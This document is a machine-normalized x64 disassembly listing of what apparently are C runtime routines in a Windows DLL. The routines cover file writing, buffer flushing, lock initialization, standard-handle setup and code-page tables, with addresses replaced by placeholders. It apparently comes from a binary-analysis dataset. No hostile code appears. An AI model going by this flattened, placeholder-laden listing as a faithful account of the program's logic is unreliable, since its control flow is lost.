cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_1800075e8
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
call sub_1800075c8
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rsp + 0x720 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r14d 0x2
add rsi 0x2
add rcx 0x2
mov ebp [ rsp + 0x40 ]
mov eax ebp
mov edx 0xd
sub eax r12d
cmp eax r13d
jb r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
movzx eax [ rbx ]
xor r14d r14d
cmp ax 0xa
mov [ rsp + 0x44 ] ax
sete r14b
add rbx 0x2
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_180005804
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x5d ] cl
mov r8d 0x2
mov [ rsp + 0x5c ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x5c ]
jmp r-xdata
mov r14 [ rsp + 0x50 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r14d esi
jg r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
mov eax ebp
mov edx 0xd
sub eax r12d
cmp eax r13d
jb r-xdata
mov eax ebp
sub eax r12d
cmp eax r13d
jae r-xdata
mov r14d [ rsp + 0x40 ]
lea rsi [ rsp + 0x720 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x44 ]
call sub_1800114e0
cmp ax [ rsp + 0x44 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
cmp sil 0x1
je r-xdata
mov r8d 0x1
mov rdx rbx
mov rax r13
sub rax rbx
add rax r12
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x44 ]
call sub_180011768
cmp eax 0xffffffff
je r-xdata
mov edi ebp
mov r8d 0xd
sub edi r12d
cmp edi r13d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rsp + rcx + 0x720 ]
mov r8d r14d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
lea r9 [ rsp + 0x48 ]
sub r8d esi
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r14d [ rsp + 0x40 ]
lea rsi [ rsp + 0x720 ]
xor ecx ecx
jmp r-xdata
add edi 0x2
test r14d r14d
je r-xdata
mov eax ebx
sub eax r12d
cmp eax r13d
jb r-xdata
mov ebx [ rsp + 0x4c ]
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x58 ]
lea rax [ rsp + 0x5c ]
lea r8 [ rsp + 0x44 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov ebp eax
test eax eax
je r-xdata
mov al [ rbx ]
mov r14 [ rsp + 0x50 ]
inc edi
mov rcx [ rbp + r14 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rbp + r14 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
mov ebx [ rsp + 0x4c ]
jmp r-xdata
lea rcx [ rsp + 0x44 ]
mov r8d 0x2
mov rdx rbx
call sub_180011768
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
jmp r-xdata
cmp r14d esi
jg r-xdata
mov ecx ebp
mov [ rsp + 0x44 ] bp
call sub_1800114e0
cmp ax [ rsp + 0x44 ]
jne r-xdata
test sil sil
jne r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
lea r9 [ rsp + 0x4c ]
lea rdx [ rsp + 0x5c ]
mov rcx [ r15 + rcx ]
mov r8d ebp
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
inc edi
inc [ rsp + 0x40 ]
mov edi ebx
sub edi r12d
add edi [ rsp + 0x40 ]
cmp [ rsp + 0x4c ] ebp
jl r-xdata
mov ebp 0xd
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
mov [ rsp + 0x5c ] bpl
lea rcx [ rw-data ]
lea r9 [ rsp + 0x4c ]
lea r8d [ rbp - 0xc ]
mov rcx [ rcx + rax * 8 ]
lea rdx [ rsp + 0x5c ]
mov rcx [ r15 + rcx ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x4c ] 0x1
jl r-xdata
inc [ rsp + 0x40 ]
inc edi
jmp r-xdata
sub_18000b7f8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r12d r8d
mov r13 rdx
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_1800075c8
xor edi edi
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r14 rbx
sar r14 0x5
lea r15 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_18000fed0
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
call sub_1800075c8
mov [ rax ] edi
or edi 0xffffffff
mov r8d r12d
mov rdx r13
mov ecx ebx
call sub_18000b098
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_18000ff78
mov eax edi
jmp r-xdata
sub_18000b92c
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x30
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_1800075a8
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
cmp edi [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx edi
call sub_18000fed0
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_1800075a8
mov [ rax ] 0x9
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_18000fe4c
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18000ff78
mov eax ebx
jmp r-xdata
call sub_1800075c8
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_18000ba40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor edi edi
mov rbx r12
lea rax [ rw-data ]
add rbx 0x10
inc edi
cmp rbx rax
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rbx ] rcx
call sub_18000f2a0
test eax eax
je r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax edi
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_18000bacc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
lea rbp [ rw-data ]
mov rdi rbx
add rdi 0x10
cmp rdi rbp
jl r-xdata
cmp [ rdi + 0x8 ] 0x1
je r-xdata
mov rsi [ rdi ]
test rsi rsi
je r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rsi
call [ DeleteCriticalSection@IAT ]
mov rcx rsi
call sub_180004690
and [ rdi ] 0x0
add rbx 0x10
cmp rbx rbp
jl r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_18000bb68
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_1800074b0
lea ecx [ rsi + 0x1d ]
call sub_180007288
mov ecx 0xff
call sub_180006d84
mov ecx 0x28
call sub_180006ad0
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_18000bc50
nop
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_1800075a8
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
mov rcx rbx
call sub_180004690
nop
mov edx 0xfa0
mov rcx rbx
call sub_18000f2a0
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_180004690
call sub_1800075a8
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
sub_18000bc50
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_18000bb68
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_180006d18
sub_18000bc94
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoA@IAT ]
nop
mov edx 0x58
lea r12d [ rdx - 0x38 ]
mov rcx r12
call sub_180006b3c
mov r11 rax
xor r15d r15d
cmp rax r15
jne r-xdata
mov [ rw-data ] rax
mov ecx r12d
mov [ rw-data ] ecx
add rax 0xb00
cmp r11 rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r15w
je r-xdata
mov [ r11 + 0x8 ] r15b
or [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] r15d
mov [ r11 + 0x38 ] r15b
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] r15d
mov [ r11 + 0x4c ] r15b
add r11 0x58
mov rax [ rw-data ]
add rax 0xb00
cmp r11 rax
jb r-xdata
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
mov r12d r15d
mov rdi r15
mov rax [ rsp + 0x68 ]
cmp rax r15
je r-xdata
mov ecx [ rw-data ]
mov [ rbx + 0x8 ] 0x81
lea eax [ r12 - 0x1 ]
neg eax
sbb ecx ecx
add ecx 0xfffffff5
mov eax 0xfffffff6
cmp r12d r15d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx ] 0xfffffffffffffffe
je r-xdata
lea r13 [ rax + 0x4 ]
movsxd rsi [ rax ]
add rsi r13
mov ebx 0x800
cmp [ rax ] ebx
cmovl ebx [ rax ]
mov edi 0x1
cmp ecx ebx
jge r-xdata
or [ rbx + 0x8 ] 0x40
mov [ rbx ] 0xfffffffffffffffe
cmp rax r15
je r-xdata
or [ rbx + 0x8 ] 0x80
jmp r-xdata
lea r14 [ rw-data ]
lea r14 [ rw-data ]
mov rbx rdi
imul rbx rbx 0x58
add rbx [ rw-data ]
cmp [ rbx ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
mov rcx rax
call [ GetFileType@IAT ]
cmp eax r15d
je r-xdata
inc r12d
inc rdi
cmp rdi 0x3
jl r-xdata
cmp [ rsi ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov [ r14 + rdi * 8 ] rax
mov eax [ rw-data ]
add eax r12d
mov [ rw-data ] eax
lea rcx [ r11 + 0xb00 ]
cmp r11 rcx
jae r-xdata
mov [ rbx ] rsi
movzx eax al
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add rsi 0x8
cmp edi ebx
jl r-xdata
cmp [ rsi ] 0xfffffffffffffffe
je r-xdata
mov edi r15d
cmp ebx r15d
jle r-xdata
inc rdi
cmp eax ebx
jl r-xdata
mov [ r11 + 0x8 ] r15b
or [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] r15d
and [ r11 + 0x38 ] 0x80
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] r15d
mov [ r11 + 0x4c ] r15b
add r11 0x58
mov rax [ r14 + rdi * 8 ]
add rax 0xb00
cmp r11 rax
jb r-xdata
cmp eax 0x3
jne r-xdata
or [ rbx + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx r12
call sub_180006b3c
mov r11 rax
cmp rax r15
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
lea rcx [ rbx + 0x10 ]
mov edx 0xfa0
call sub_18000f2a0
cmp eax r15d
je r-xdata
or [ rbx + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ rbx + 0xc ]
jmp r-xdata
movsxd r12 edi
mov rax r12
sar rax 0x5
and r12d 0x1f
imul r12 r12 0x58
add r12 [ r14 + rax * 8 ]
mov rax [ rsi ]
mov [ r12 ] rax
mov al [ r13 ]
mov [ r12 + 0x8 ] al
lea rcx [ r12 + 0x10 ]
mov edx 0xfa0
call sub_18000f2a0
cmp eax r15d
je r-xdata
mov rcx [ rsi ]
call [ GetFileType@IAT ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ r12 + 0xc ]
jmp r-xdata
sub_18000bf84
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
lea rax [ rw-data ]
add rbx 0x8
cmp rbx rax
jl r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_180004690
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_18000bff0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push r12
sub rsp 0x30
xor esi esi
lea ecx [ rsi + 0x1 ]
call sub_18000bc50
nop
lea ebx [ rsi + 0x3 ]
mov [ rsp + 0x20 ] ebx
mov ecx 0x1
call sub_18000bb50
mov eax esi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_1800052b0
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + r12 * 8 ]
call sub_180004690
mov r11 [ rw-data ]
and [ r11 + r12 * 8 ] 0x0
inc esi
mov [ rsp + 0x24 ] esi
sub_18000c0a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8 rsi
xor edx edx
call sub_180009540
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0x4 ] r11d
mov [ rbp + 0x8 ] r11d
mov [ rbp + 0xc ] r11d
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
sub rsi 0x1
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
sub rdx 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18000c134
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x570 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rdx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rdx ] al
inc eax
inc rdx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rsp + 0x570 ]
xor rcx rsp
call sub_1800042d0
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x370 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180011fb4
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180011cb0
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x270 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180011cb0
lea r11 [ rsp + 0x370 ]
lea rcx [ rsi + 0x1d ]
xor edx edx
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov rax r8
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_180009540
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rsp + rdx + 0x170 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ rsp + rdx + 0x270 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
inc rdx
add r11 0x2
sub rbx 0x1
jne r-xdata
sub_18000c318
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_1800068b0
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_18000bc50
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_18000bb50
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_180006d18
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ] 0x1
mov rbx [ rsp + 0x30 ]
[ rbx ] 0xffffffff
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_180004690
sub_18000c3d4
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180005710
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18000c464
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_18000c3d4
xor ebx ebx
mov edi eax
cmp eax ebx
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_18000c0a0
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180009540
lea rbp [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
add rbp rbp
mov r10d 0x4
lea r8 [ r13 + rbp * 8 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub r10 r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_1800042d0
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
cmp eax ebx
je r-xdata
movzx eax [ rdi ]
add rdi 0x2
mov [ rdx ] ax
add rdx 0x2
sub rcx r12
jne r-xdata
mov rcx rsi
call sub_18000c134
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
cmp eax ebx
je r-xdata
mov [ rsi + 0xc ] ebx
lea rdx [ rsi + 0x10 ]
lea rdi [ r13 + rbp * 8 + 0x4 ]
mov ecx 0x6
mov ebx 0x412
jmp r-xdata
cmp edi r12d
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180009540
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
cmp ecx r12d
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_18000c6dc
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_1800068b0
mov rsi rax
call sub_18000c318
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_18000c3d4
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_180006ad0
mov rbx rax
xor edi edi
cmp rax rdi
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_1800059c0
mov [ rbx ] edi
mov rdx rbx
